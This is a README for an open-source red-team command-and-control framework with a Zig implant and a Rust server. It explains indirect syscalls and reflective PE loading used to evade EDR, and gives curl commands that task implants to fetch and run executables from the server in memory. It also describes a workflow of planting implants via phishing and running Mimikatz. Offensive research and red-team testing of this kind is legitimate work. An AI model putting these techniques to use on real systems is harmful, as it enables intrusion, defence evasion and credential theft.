# Kronos

A Command & Control framework I built for red team operations and penetration testing. If you're tired of bloated C2s or want to understand how modern evasion techniques actually work under the hood, this might interest you.

## What This Is

Kronos is my attempt at building a C2 framework that's both stealthy and educational. The implant is written in Zig and uses indirect syscalls combined with reflective PE loading to evade most EDR solutions. The server is written in Rust because I wanted something that wouldn't crash when managing multiple implants under load.

This started as a learning project to really understand Windows internals and offensive security techniques, but it evolved into something I actually use for testing. The code is intentionally well-commented because I remember how painful it was learning this stuff without good resources.

## Why I Picked These Languages

**Zig for the implant** was a deliberate choice. Most C2 implants are written in C/C++ or recently Rust, but Zig gives you something special: truly tiny binaries. We're talking sub-50KB executables when compiled with `ReleaseSmall`. Smaller binaries are harder to detect, faster to exfiltrate, and honestly just more elegant. Zig also has fantastic inline assembly support, which you absolutely need when you're manually invoking syscalls.

The lack of runtime overhead means there's less for defenders to fingerprint, and the language is obscure enough that automated RE tools don't have great Zig support yet. Plus, I actually enjoy writing Zig (besides the type safety shenanigans).

**Rust for the server** was the obvious choice. When you're managing multiple implants, handling HTTP requests, and juggling a database, the last thing you want is a server that crashes because of a memory bug. Rust's type system and ownership model mean I can write concurrent code without worrying about data races or segfaults. The server has been rock-solid in testing, and I attribute that mostly to Rust catching my mistakes at compile time instead of runtime.

The ecosystem is also mature - Axum for the web framework, SQLx for database interactions, and Tokio for async runtime. Everything just works.

## How It Actually Works

The implant does something most commercial C2s do: it avoids the Windows API entirely. Instead of calling functions like `VirtualAlloc` or `CreateThread` through the standard import table (which EDRs love to hook), the implant walks the Process Environment Block (PEB) to find ntdll.dll, parses its export table to resolve syscall numbers, and then executes syscalls directly using a clean gadget found in ntdll's code section.

This is called "indirect syscalling" and it's one of the more effective ways to evade userland hooks. EDRs that only hook at the API layer completely miss this. Of course, kernel-mode callbacks can still catch you, but that's a different problem.

The reflective PE loader is probably the most complex part of the implant. It takes a PE file (like a Beacon payload or Mimikatz), loads it entirely in memory, fixes up relocations, resolves imports, sets correct memory protections, and then executes it. No files touch disk. The loader handles import forwarding (where one DLL forwards exports to another), which is something a lot of simple loaders break on.

The server side is straightforward by comparison. It's a REST API with a SQLite backend. Implants check in, receive tasks, execute them, and return results. The database keeps track of everything - active implants, pending tasks, completed results. I kept it simple on purpose because complex C2 infrastructure is just more stuff that can break during an engagement.

## Current Features

Right now, the implant can execute indirect syscalls for memory operations, load PE files reflectively, and communicate with the C2 server over HTTP. It checks in at randomized intervals (3-10 seconds with jitter) to avoid creating predictable network patterns. The syscall numbers are resolved dynamically at runtime by parsing ntdll, so even if Microsoft changes syscall numbers between Windows versions, it still works.

The server can manage multiple implants simultaneously, queue tasks for specific agents, and retrieve results. There's basic tracking of implant metadata - hostname, username, OS info, first/last seen timestamps. Nothing fancy, but enough to know what you're working with.

The PE loader handles most well-formed executables. It supports base relocations (so ASLR isn't a problem), resolves imports including forwarded exports, and sets section permissions correctly. I've tested it with various payloads including Mimikatz and custom tooling.

## What I'm Planning to Add

There are comments scattered throughout the code marking things I haven't implemented yet. The big ones are TLS callback support in the PE loader (some executables use these for initialization), GUI subsystem support (currently only console apps work reliably), and APC-based injection as an alternative execution method.

I also want to add proper encryption to the C2 channel - right now it's just HTTP which is obviously not ideal for real operations. HTTPS is the minimum, but I'm considering custom protocols or domain fronting support.

A web-based operator interface is on the roadmap too. Right now you're stuck with curl commands which is fine for me but not great for teams. Something like Havoc's UI would be ideal - clean, functional, not trying to be fancy.

Process hollowing and module stomping are other injection techniques I want to implement. The more options an operator has, the better. Different environments require different approaches.

## Known Limitations

Let me be upfront about what doesn't work or isn't implemented yet:

The C2 communication is HTTP only and unencrypted. This is obviously bad OPSEC and I'm aware. It's on the list to fix, but for now, don't use this on real engagements without tunneling through something secure.

The PE loader doesn't support TLS callbacks yet, which some executables rely on for initialization. If you try to load something that uses TLS, it might crash or behave weirdly. Same deal with GUI subsystem executables - they're hit or miss right now.

Error handling is pretty basic in places. The implant won't gracefully recover from all failure states, and some edge cases probably crash it. I've hardened the critical paths but there's definitely room for improvement.

It's Windows x64 only. No support for ARM, 32-bit, or obviously Linux/macOS. The syscall stuff is deeply tied to Windows internals, so porting would basically be rewriting everything.

Multi-operator support isn't a thing. One server, one operator. If you need team features, this isn't ready for that **YET**.

## Installation & Usage

You'll need Zig 0.13.0 for the implant and Rust 1.70+ for the server. SQLite3 should be installed on your system (though SQLx will handle a lot of this automatically).

Building the server is standard Rust:
```
cd server
cargo build --release
```

The implant compiles with:
```
cd implant
zig build -Doptimize=ReleaseSmall
```

You want `ReleaseSmall` for minimal binary size. The compiled implant lands in `zig-out/bin/`.

I also have a simple hello world payload I recommend you use for testing or just tweak it but make sure to use `-fsingle-threaded` flag during compilation:
```
cd payload
zig build-exe src/main.zig -fsingle-threaded
```

Starting the server is just running the binary:
```
cd server
cargo run --release
```

It listens on `127.0.0.1:3000` by default. You can check if it's up with:
```
curl http://127.0.0.1:3000/health
```

To see active implants:
```
curl http://127.0.0.1:3000/implants
```

## Tasking Implants

There are two ways to load PEs into an implant:

### 1. Load PE from Disk (load_pe)
Load a PE file from the target's filesystem:
```bash
curl -X POST http://127.0.0.1:3000/task/add -H "Content-Type: application/json" -d "{\"task_id\":\"test_name\",\"command\":\"load_pe\",\"args\":[\"path\\to\\exe\"],\"task_implant_id\":\"agent_id\"}"
```

If you compiled the example payload, you can test it with(assuming you're running the implant from `zig-out/bin`):
```
curl -X POST http://127.0.0.1:3000/task/add -H "Content-Type: application/json" -d "{\"task_id\":\"test_pe\",\"command\":\"load_pe\",\"args\":[\"..\\..\\..\\payload\\main.exe\"],\"task_implant_id\":\"agent_001\"}"
```
Note: Double backslashes are required for JSON escaping.

### 2. Load PE from C2 Server (load_pe_remote)
Download and load a PE directly from the C2 server without touching disk:
```
curl -X POST http://127.0.0.1:3000/task/add -H "Content-Type: application/json" -d "{\"task_id\":\"test_name\",\"command\":\"load_pe_remote\",\"args\":[\"path\\to\\exe\"],\"task_implant_id\":\"agent_id\"}"
```

Or once again, if you compiled the example payload and want to test it fast, use this command directly:
```
curl -X POST http://127.0.0.1:3000/task/add -H "Content-Type: application/json" -d "{\"task_id\":\"test_pe_remote\",\"command\":\"load_pe_remote\",\"args\":[\"main.exe\"],\"task_implant_id\":\"agent_001\"}"
```

For load_pe_remote, place your PE files in the `payload/` directory at the project root. The server will automatically base64 encode and serve them to implants. This method is stealthier as the PE never exists as a file on the target system.

### Retrieving Results
```
curl http://127.0.0.1:3000/result
```
This returns all pending results from the database and clears them.

### Configuration
The implant automatically checks in with the server. The server address is currently hardcoded as `127.0.0.1:3000` - change the `C2_SERVER` constant in the implant code for production use.

## A Typical Workflow

Start your server on your attack box. Deploy the implant to the target however you usually do - phishing, physical access, whatever. Once the implant executes, it'll check in and you'll see it in the implants list.

You can then task it with PE loading or other commands. The implant polls every few seconds, grabs the task, executes it, and sends back the result. Simple and effective.

For example, if you wanted to run Mimikatz in memory:
1. Compile the implant and get it on target
2. Add a task to load your Mimikatz binary (make sure to strip TLS)
3. Wait for the implant to check in and execute
4. Retrieve the results

No files written to disk (assuming your PE payload also stays in memory), minimal API calls, clean syscalls. That's the goal anyway.

## Technical Notes

The indirect syscall implementation manually resolves syscall numbers by reading the function stubs in ntdll. Each syscall function starts with `mov eax, [syscall_number]` followed by `syscall; ret`. We scan for this pattern, extract the number, set up registers according to the Windows x64 calling convention (with rcx->r10 for the syscall itself), and call through a clean gadget we find in ntdll's .text section.

This bypasses hooks at the API layer but not kernel callbacks or minifilters. If you're up against a mature EDR, you'll need additional evasion (sleep obfuscation, indirect control flow, etc.). This is a starting point, not a complete solution.

The reflective loader maps sections with the correct memory protections (RWX handling, etc.), processes the import address table by walking each import descriptor, and handles forwarded exports by recursively resolving them. Relocations are applied when the preferred base address isn't available, which is most of the time thanks to ASLR.

## Why Open Source This?

I learned offensive security by reading other people's code and implementations. Projects like Cobalt Strike (before it was commercialized), Metasploit, and various proof-of-concepts taught me more than any course or book. I'm open sourcing this so others can learn the same way.

Also, I'm planning to build a more advanced commercial version later with additional features, better OPSEC, and proper team support. This is the foundation - functional, educational, and hopefully useful for people getting into red team development.

If you find bugs or have suggestions, feel free to open issues or PRs. I'm actively developing this and appreciate feedback.

---
## Update: What This Became
I didn't expect to get this far.

What started as Kronos, a learning project to understand Windows Internals evolved into something I am genuinely proud of. SF-25 Monarch (US Military inspired) is the successor to the project, built under the Imperial Arch. Same foundation, completely different scale.

A little about the current successor. The tech stack remains the same at its core: Zig implant (with a small C wrapper...zig refused to play nice, and x86 Assembly), an async Rust server, and a Rust based GUI built on egui. The implant currently supports 50+ commands with BOF, .NET, EXE, DLL, and shellcode execution support, all reflectively ofcourse. 

Windows Defender is always enabled during testing and debugging, because apparently Microsoft doesn't get the memo that it's my laptop. That said, it has been tested against several AV and EDR/XDR solutions and held up surpisingly well.

![MONARCH](https://github.com/user-attachments/assets/28887394-d1cf-4ad0-9b0c-676c6784eecc)

Development continues. This repo stays as the open-source foundation it was always meant to be.
## Credits

Built by a one man army - Mirae

Contact info: neonxodyssey@gmail.com (soon to have a professional email)

A massive inspiration for how far this project went is the [Havoc Framework](https://github.com/HavocFramework/Havoc) and the team behind it. Genuinely looking through their codebase, the architecture decisions, and especially the Firebeam VM in the professional version changed how I thought about C2 development entirely. I wouldn't have pushed this far without their work existing as a reference for what's actually possible.
